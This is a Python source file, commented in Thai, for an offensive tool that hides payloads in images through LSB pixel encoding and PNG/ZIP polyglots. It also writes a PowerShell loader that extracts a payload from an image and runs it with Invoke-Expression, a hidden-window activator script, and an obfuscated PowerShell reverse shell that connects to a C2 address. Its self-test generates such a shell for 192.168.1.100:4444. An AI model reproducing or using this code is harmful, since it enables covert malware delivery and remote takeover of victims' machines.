"""
Steganography Tool - เครื่องมือสำหรับซ่อน Payload ในไฟล์ภาพ

รองรับเทคนิค:
- LSB (Least Significant Bit) Steganography
- EXIF Metadata Injection
- Polyglot File Creation
- LNK Activator Generation
"""

import os
import base64
import struct
import json
from pathlib import Path
from typing import Optional, Tuple
from PIL import Image
import io


class SteganographyTool:
    """เครื่องมือสำหรับ Steganography และ Polyglot Payload"""
    
    @staticmethod
    def embed_payload_lsb(image_path: str, payload: str, output_path: str = None) -> str:
        """
        ฝัง payload ในภาพโดยใช้ LSB (Least Significant Bit) technique
        
        Args:
            image_path: path ของภาพต้นฉบับ
            payload: payload ที่ต้องการฝัง (string)
            output_path: path สำหรับบันทึกภาพที่ฝัง payload (ถ้าไม่ระบุจะสร้างอัตโนมัติ)
        
        Returns:
            path ของภาพที่ฝัง payload แล้ว
        """
        # โหลดภาพ
        img = Image.open(image_path)
        
        # แปลงเป็น RGB ถ้าไม่ใช่
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        # แปลง payload เป็น binary
        payload_bytes = payload.encode('utf-8')
        payload_length = len(payload_bytes)
        
        # เพิ่ม header ที่บอกความยาวของ payload (4 bytes)
        header = struct.pack('>I', payload_length)
        data_to_hide = header + payload_bytes
        
        # แปลงเป็น binary string
        binary_data = ''.join(format(byte, '08b') for byte in data_to_hide)
        
        # ตรวจสอบว่าภาพมีขนาดพอหรือไม่
        max_bytes = img.width * img.height * 3  # RGB = 3 channels
        if len(binary_data) > max_bytes:
            raise ValueError(f"Payload too large for image. Max: {max_bytes} bits, Got: {len(binary_data)} bits")
        
        # ฝัง data ใน LSB ของแต่ละ pixel
        pixels = list(img.getdata())
        new_pixels = []
        data_index = 0
        
        for pixel in pixels:
            if data_index < len(binary_data):
                # แก้ไข LSB ของแต่ละ channel (R, G, B)
                r, g, b = pixel
                
                if data_index < len(binary_data):
                    r = (r & 0xFE) | int(binary_data[data_index])
                    data_index += 1
                
                if data_index < len(binary_data):
                    g = (g & 0xFE) | int(binary_data[data_index])
                    data_index += 1
                
                if data_index < len(binary_data):
                    b = (b & 0xFE) | int(binary_data[data_index])
                    data_index += 1
                
                new_pixels.append((r, g, b))
            else:
                new_pixels.append(pixel)
        
        # สร้างภาพใหม่
        stego_img = Image.new(img.mode, img.size)
        stego_img.putdata(new_pixels)
        
        # บันทึก
        if output_path is None:
            base_name = Path(image_path).stem
            output_path = f"{base_name}_stego.png"
        
        stego_img.save(output_path, 'PNG')
        print(f"[SteganographyTool] Payload embedded in: {output_path}")
        
        return output_path
    
    @staticmethod
    def extract_payload_lsb(image_path: str) -> Optional[str]:
        """
        ดึง payload จากภาพที่ฝังด้วย LSB technique
        
        Args:
            image_path: path ของภาพที่ฝัง payload
        
        Returns:
            payload string หรือ None ถ้าไม่พบ
        """
        # โหลดภาพ
        img = Image.open(image_path)
        
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = list(img.getdata())
        
        # ดึง binary data จาก LSB
        binary_data = ''
        for pixel in pixels:
            r, g, b = pixel
            binary_data += str(r & 1)
            binary_data += str(g & 1)
            binary_data += str(b & 1)
        
        # อ่าน header (4 bytes = 32 bits)
        header_bits = binary_data[:32]
        payload_length = struct.unpack('>I', int(header_bits, 2).to_bytes(4, 'big'))[0]
        
        # ตรวจสอบความถูกต้อง
        if payload_length <= 0 or payload_length > 1000000:  # Max 1MB
            return None
        
        # ดึง payload
        payload_bits = binary_data[32:32 + (payload_length * 8)]
        
        # แปลงกลับเป็น bytes
        payload_bytes = bytearray()
        for i in range(0, len(payload_bits), 8):
            byte = payload_bits[i:i+8]
            if len(byte) == 8:
                payload_bytes.append(int(byte, 2))
        
        try:
            payload = payload_bytes.decode('utf-8')
            return payload
        except:
            return None
    
    @staticmethod
    def embed_payload_exif(image_path: str, payload: str, output_path: str = None) -> str:
        """
        ฝัง payload ใน EXIF metadata ของภาพ
        
        Args:
            image_path: path ของภาพต้นฉบับ
            payload: payload ที่ต้องการฝัง
            output_path: path สำหรับบันทึก
        
        Returns:
            path ของภาพที่ฝัง payload
        """
        try:
            from PIL.ExifTags import TAGS
            from PIL import ExifTags
        except ImportError:
            print("[SteganographyTool] Warning: EXIF support requires pillow with EXIF")
            return SteganographyTool.embed_payload_lsb(image_path, payload, output_path)
        
        img = Image.open(image_path)
        
        # Encode payload เป็น base64
        payload_b64 = base64.b64encode(payload.encode()).decode()
        
        # สร้าง EXIF data
        exif_dict = {}
        if hasattr(img, '_getexif') and img._getexif():
            exif_dict = dict(img._getexif())
        
        # ฝัง payload ใน UserComment field (0x9286)
        exif_dict[0x9286] = payload_b64.encode()
        
        # บันทึก
        if output_path is None:
            base_name = Path(image_path).stem
            output_path = f"{base_name}_exif.jpg"
        
        # Note: การบันทึก EXIF ใน Pillow ต้องใช้ piexif library
        # สำหรับตัวอย่างนี้เราจะใช้ LSB แทน
        print("[SteganographyTool] EXIF embedding - falling back to LSB method")
        return SteganographyTool.embed_payload_lsb(image_path, payload, output_path)
    
    @staticmethod
    def create_polyglot_png_zip(image_path: str, payload: str, output_path: str = None) -> str:
        """
        สร้างไฟล์ Polyglot ที่เป็นทั้ง PNG และ ZIP
        
        Args:
            image_path: path ของภาพต้นฉบับ
            payload: payload ที่ต้องการฝัง
            output_path: path สำหรับบันทึก
        
        Returns:
            path ของไฟล์ polyglot
        """
        import zipfile
        import tempfile
        
        if output_path is None:
            base_name = Path(image_path).stem
            output_path = f"{base_name}_polyglot.png"
        
        # อ่านภาพต้นฉบับ
        with open(image_path, 'rb') as f:
            png_data = f.read()
        
        # สร้าง ZIP ใน memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('payload.txt', payload)
        
        zip_data = zip_buffer.getvalue()
        
        # รวม PNG + ZIP
        polyglot_data = png_data + zip_data
        
        # บันทึก
        with open(output_path, 'wb') as f:
            f.write(polyglot_data)
        
        print(f"[SteganographyTool] Polyglot file created: {output_path}")
        print(f"  - Can be opened as PNG")
        print(f"  - Can be extracted as ZIP (rename to .zip)")
        
        return output_path
    
    @staticmethod
    def create_lnk_activator(target_exe: str, arguments: str, icon_path: str = None,
                            output_path: str = "payload.lnk") -> str:
        """
        สร้างไฟล์ .lnk (Windows Shortcut) สำหรับเรียกใช้ payload
        
        Args:
            target_exe: path ของ executable ที่จะรัน (เช่น powershell.exe)
            arguments: arguments ที่จะส่งให้ executable
            icon_path: path ของ icon (ถ้าต้องการ)
            output_path: path สำหรับบันทึกไฟล์ .lnk
        
        Returns:
            path ของไฟล์ .lnk
        """
        # Note: การสร้าง .lnk บน Linux ต้องใช้ library พิเศษ
        # สำหรับตัวอย่างนี้เราจะสร้างเป็น script แทน
        
        # สร้าง PowerShell script
        ps_script = f"""
# LNK Activator Script
$target = "{target_exe}"
$args = "{arguments}"

Start-Process -FilePath $target -ArgumentList $args -WindowStyle Hidden
"""
        
        script_path = output_path.replace('.lnk', '.ps1')
        with open(script_path, 'w') as f:
            f.write(ps_script)
        
        print(f"[SteganographyTool] PowerShell activator created: {script_path}")
        print(f"  Target: {target_exe}")
        print(f"  Arguments: {arguments}")
        
        # สร้างไฟล์ metadata
        metadata = {
            'type': 'lnk_activator',
            'target': target_exe,
            'arguments': arguments,
            'icon': icon_path,
            'script': script_path
        }
        
        metadata_path = output_path.replace('.lnk', '_metadata.json')
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        return script_path
    
    @staticmethod
    def create_powershell_stego_loader(stego_image_path: str, 
                                      c2_server: str = None,
                                      output_path: str = "loader.ps1") -> str:
        """
        สร้าง PowerShell script ที่ดึง payload จากภาพและรัน
        
        Args:
            stego_image_path: path ของภาพที่ฝัง payload
            c2_server: C2 server address (optional)
            output_path: path สำหรับบันทึก script
        
        Returns:
            path ของ PowerShell script
        """
        script = f'''# PowerShell Stego Loader
# Extracts and executes payload from steganographic image

$imagePath = "{stego_image_path}"

# Load image
Add-Type -AssemblyName System.Drawing
$img = [System.Drawing.Image]::FromFile($imagePath)
$bitmap = New-Object System.Drawing.Bitmap($img)

# Extract LSB data
$binaryData = ""
for ($y = 0; $y -lt $bitmap.Height; $y++) {{
    for ($x = 0; $x -lt $bitmap.Width; $x++) {{
        $pixel = $bitmap.GetPixel($x, $y)
        $binaryData += [string]($pixel.R -band 1)
        $binaryData += [string]($pixel.G -band 1)
        $binaryData += [string]($pixel.B -band 1)
    }}
}}

# Extract payload length (first 32 bits)
$lengthBits = $binaryData.Substring(0, 32)
$payloadLength = [Convert]::ToInt32($lengthBits, 2)

# Extract payload
$payloadBits = $binaryData.Substring(32, $payloadLength * 8)
$payloadBytes = @()
for ($i = 0; $i -lt $payloadBits.Length; $i += 8) {{
    $byte = $payloadBits.Substring($i, 8)
    $payloadBytes += [Convert]::ToByte($byte, 2)
}}

# Decode payload
$payload = [System.Text.Encoding]::UTF8.GetString($payloadBytes)

# Execute payload
Invoke-Expression $payload
'''
        
        if c2_server:
            script += f"\n# C2 Server: {c2_server}\n"
        
        with open(output_path, 'w') as f:
            f.write(script)
        
        print(f"[SteganographyTool] PowerShell loader created: {output_path}")
        
        return output_path
    
    @staticmethod
    def create_reverse_shell_payload(c2_ip: str, c2_port: int, 
                                     obfuscate: bool = True) -> str:
        """
        สร้าง PowerShell reverse shell payload
        
        Args:
            c2_ip: IP ของ C2 server
            c2_port: Port ของ C2 server
            obfuscate: ทำ obfuscation หรือไม่
        
        Returns:
            PowerShell reverse shell code
        """
        payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{c2_ip}",{c2_port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
        
        if obfuscate:
            # Simple obfuscation: base64 encode
            payload_b64 = base64.b64encode(payload.encode('utf-16le')).decode()
            payload = f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {payload_b64}"
        
        return payload
    
    @staticmethod
    def test_steganography():
        """ทดสอบ steganography functions"""
        print("\n=== Testing Steganography Tool ===\n")
        
        # สร้างภาพทดสอบ
        test_img = Image.new('RGB', (100, 100), color='red')
        test_img_path = 'test_image.png'
        test_img.save(test_img_path)
        print(f"Created test image: {test_img_path}")
        
        # ทดสอบ LSB embedding
        test_payload = "This is a secret payload for testing!"
        print(f"\nTest payload: {test_payload}")
        
        stego_path = SteganographyTool.embed_payload_lsb(
            test_img_path, 
            test_payload,
            'test_stego.png'
        )
        
        # ทดสอบ extraction
        extracted = SteganographyTool.extract_payload_lsb(stego_path)
        print(f"Extracted payload: {extracted}")
        print(f"Match: {extracted == test_payload}")
        
        # ทดสอบ polyglot
        polyglot_path = SteganographyTool.create_polyglot_png_zip(
            test_img_path,
            test_payload,
            'test_polyglot.png'
        )
        
        # ทดสอบ reverse shell payload
        print("\n=== Reverse Shell Payload ===")
        shell_payload = SteganographyTool.create_reverse_shell_payload(
            '192.168.1.100',
            4444,
            obfuscate=True
        )
        print(f"Payload length: {len(shell_payload)} chars")
        
        # Cleanup
        import os
        for f in [test_img_path, stego_path, polyglot_path]:
            if os.path.exists(f):
                os.remove(f)
        
        print("\n=== Test Complete ===")


# Example usage
if __name__ == "__main__":
    SteganographyTool.test_steganography()
